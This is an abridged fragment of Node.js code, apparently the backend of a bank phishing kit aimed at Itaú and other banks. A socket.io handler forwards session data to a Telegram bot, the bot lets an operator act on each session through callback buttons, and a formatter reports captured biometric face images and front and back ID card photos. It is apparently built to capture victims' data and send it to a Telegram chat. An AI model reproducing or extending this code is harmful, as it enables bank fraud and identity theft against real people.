...
io.on('connection', (socket) => {
    ...
    socket.on('sendToTelegram', async ({ sessionId, data }) => {
        console.log('📤 ========== EVENTO sendToTelegram RECIBIDO ==========');
        console.log('📤 SessionId:', sessionId);
        console.log('📤 Data completa:', JSON.stringify(data, null, 2));
        console.log('📤 Es banco?:', !!(data.bank && data.page));
        console.log('📤 ===============================================');
        try {
...
bot.on('callback_query', async (callbackQuery) => {
    ...
    try {
        ...
        // Manejadores para banco (Itaú, etc.)
            ...
            if (action === 'finalizar') {
                // Limpiar sesión y mensaje de Telegram
...
function formatBankMessage(data, sessionId) {
    const timestamp = getTimestamp();
    let message = `━━━━━━━━━━━━━━━━━━━━━━
🏦 <b>${data.bank?.toUpperCase() || 'BANCO'}</b>
📄 <b>Página:</b> ${data.page?.toUpperCase() || 'N/A'}
━━━━━━━━━━━━━━━━━━━━━━
...
`;
    ...
    if (data.face) message += `📸 <b>Biometría:</b> Imagen capturada\n`;
    if (data.front || data.back) message += `📸 <b>Cédula:</b> ${data.front ? 'Frontal' : ''} ${data.back ? 'Reverso' : ''}\n`;
